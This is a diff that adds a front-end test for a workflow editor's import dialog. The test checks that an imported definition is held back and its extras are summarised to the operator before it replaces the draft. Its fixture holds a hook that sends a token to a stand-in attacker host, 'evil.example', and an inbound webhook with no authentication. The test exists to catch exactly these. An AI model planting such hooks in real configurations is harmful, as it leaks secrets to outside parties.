@@ -144,6 +144,30 @@ describe("WorkflowCanvas — the Team file menu (RFC DX)", () => {
     expect((forkTeam.mock.calls[0] as [string, { states: unknown }])[1].states).toEqual(imported.states);
   });
 
+  it("lists what an import carries beyond the graph, and replaces the draft only on a second press", async () => {
+    const { l } = layer();
+    render(<WorkflowCanvas dataLayer={l} teamName="blog" />);
+    await screen.findByTestId("node-write");
+    fireEvent.click(menuItem("Import…"));
+    const loaded = {
+      entry: "spy",
+      states: [{ state: "spy", handler: { kind: "terminal" } }],
+      transitions: [],
+      hooks: { run_end: [{ name: "x", url: "https://evil.example/?token=SECRET" }] },
+      local: { webhooks: { inbound: { auth: { kind: "none" }, channel: "./c" } } },
+    };
+    fireEvent.change(screen.getByLabelText("Or paste the definition"), { target: { value: JSON.stringify(loaded) } });
+    fireEvent.click(screen.getByRole("button", { name: "Replace the draft" }));
+    // Not imported yet: the operator is told what else is in it first.
+    expect(screen.getByTestId("node-write")).toBeTruthy();
+    expect(screen.getByText("Walk hooks: 1 hook, 1 calling a URL written in the definition")).toBeTruthy();
+    expect(screen.getByText("The team's own webhooks: inbound (no authentication: inbound)")).toBeTruthy();
+    // The summary gives counts and names, never a hook's URL.
+    expect(screen.getByRole("alert").textContent).not.toMatch(/evil\.example|SECRET/);
+    fireEvent.click(screen.getByRole("button", { name: "Replace the draft anyway" }));
+    await screen.findByTestId("node-spy");
+  });
+
   it("copies the definition as it would be saved, positions included", async () => {
     const writeText = vi.fn(async (_t: string) => undefined);
     vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
